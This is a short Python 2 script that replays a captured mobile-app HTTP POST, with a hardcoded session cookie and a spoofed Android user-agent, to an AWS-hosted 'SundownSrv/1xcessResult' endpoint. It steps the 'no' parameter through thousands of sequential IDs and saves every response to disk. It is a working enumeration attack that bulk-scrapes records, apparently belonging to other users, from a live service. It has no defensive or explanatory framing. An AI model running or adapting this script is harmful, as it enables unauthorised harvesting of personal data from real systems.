from burp import *
import time, os

start_range = 20001
folder		= 'records21'
total		= 20000
skip_errors = [1003]
c = """
POST /SundownSrv/1xcessResult HTTP/1.1
Cookie: JSESSIONID=63FD1BCDB0DB6184606A7B63FE98C5F5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; MI NOTE LTE MIUI/6.4.14)
Host: ec2-52-34-46-127.us-west-2.compute.amazonaws.com
Connection: close
Accept-Encoding: gzip
Content-Length: 9

no=%s&
"""

end_range = start_range + total
try:
	start_range = int(os.listdir('records21')[-1][:-4]) + 1
except:
	pass

for i in range(start_range, end_range):
	## Sleep for a while
	if i % 10 == 0:
		print '%d%% Done. %d/%d' % (((i - start_range) * 100) / total, (i - start_range), end_range - start_range)
		time.sleep(3)

	r = code('http', c % (i))

	rjson = r.json()
	if not rjson[u'result'] == 0:
		if rjson[u'result'] in skip_errors:
			continue
		print 'Error: %d, Code: %d' % (rjson[u'result'], i)
		exit()

	with open('%s/%d.txt' % (folder, i), 'w') as f:
		f.write(r.text.encode('ascii', 'ignore').decode('ascii'))

	
